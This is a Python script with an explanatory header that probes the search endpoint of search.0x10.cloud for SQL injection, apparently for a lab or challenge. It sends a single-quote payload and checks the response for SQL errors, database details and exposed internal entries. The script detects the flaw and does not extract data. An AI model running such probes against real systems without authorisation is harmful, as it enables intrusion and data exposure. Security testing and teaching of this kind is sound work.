# ============================================================
#  VULNERABILITY: SQL Injection (SQLi)
#  Target: search.0x10.cloud
#  Author: Kalid Ali
# ============================================================
#
#  SQL Injection is a vulnerability where user input is directly
#  inserted into a database query without proper validation.
#
#  This can allow attackers to:
#  - Break the structure of the SQL query
#  - Trigger database error messages
#  - Change how the query behaves (e.g., return all records)
#  - Reveal internal application or database information
#
#  In this case, the search feature is vulnerable because it
#  does not properly sanitize input. When a special character
#  is submitted, the server returns SQL errors, exposes database
#  details, and may return unintended results.
#
#  This script demonstrates how a simple input can interfere
#  with the backend query and reveal sensitive system behavior.
#
#  Technique: Send a crafted payload through the search parameter,
#  then analyze the HTTP response for SQL errors, debug messages,
#  and unexpected data returned by the server.
# ============================================================

import urllib.request
import urllib.parse
import time

print("=" * 50)
print("  SQL Injection Tester")
print("=" * 50)

# --- Configuration ---
# Target search endpoint
target = "http://search.0x10.cloud/search"

# Test input used to break SQL query structure
test_character = "'"

print(f"\n  [1] Testing {target} for SQL Injection...")

try:
    # server allows ~10 requests per second
    time.sleep(0.15)

    # Encode input into URL-safe format (e.g., ' → %27)
    # This ensures the payload is properly sent in the HTTP request
    query_data = urllib.parse.urlencode({'q': test_character})
    full_url = f"{target}?{query_data}"

    # Send request and retrieve HTML response from server
    response = urllib.request.urlopen(full_url, timeout=5)
    html_code = response.read().decode('utf-8')

    # --- Analyze response for SQL Injection indicators ---
    found = False

    # SQL errors suggest that user input broke the query
    if "SQL syntax" in html_code or "MySQL" in html_code:
        print("      [-] SQL error message detected in response.")
        print("      [-] Indicates that input is not properly sanitized.")
        found = True

    # Database information disclosure (e.g., version, schema)
    if "MySQL" in html_code:
        print("      [-] Database details exposed (version and schema).")
        found = True

    # Indicates that the query logic was altered by the input
    if "All Records Returned" in html_code:
        print("      [-] Query manipulation successful: all records returned.")
        found = True

    # Internal entries visible in results (metadata, not actual secrets)
    if "Database Credentials" in html_code or "SSH Key" in html_code:
        print("      [-] Internal system entries visible (titles only).")
        found = True

    # --- Final result ---
    if found:
        print("\n  [!] VULNERABILITY FOUND")
        print("      [-] The search parameter is vulnerable to SQL Injection.")
        print("      [-] Input can alter query behavior and expose internal data.")
    else:
        print("\n  [OK] No SQL Injection indicators detected.")

except Exception as e:
    # A server error (HTTP 500) may indicate the query failed internally
    if "500" in str(e):
        print("\n  [!] VULNERABILITY LIKELY")
        print("      [-] Server returned HTTP 500 (possible SQL error).")
    else:
        print(f"\n  [ERROR] Request failed: {e}")

print("\n" + "=" * 50)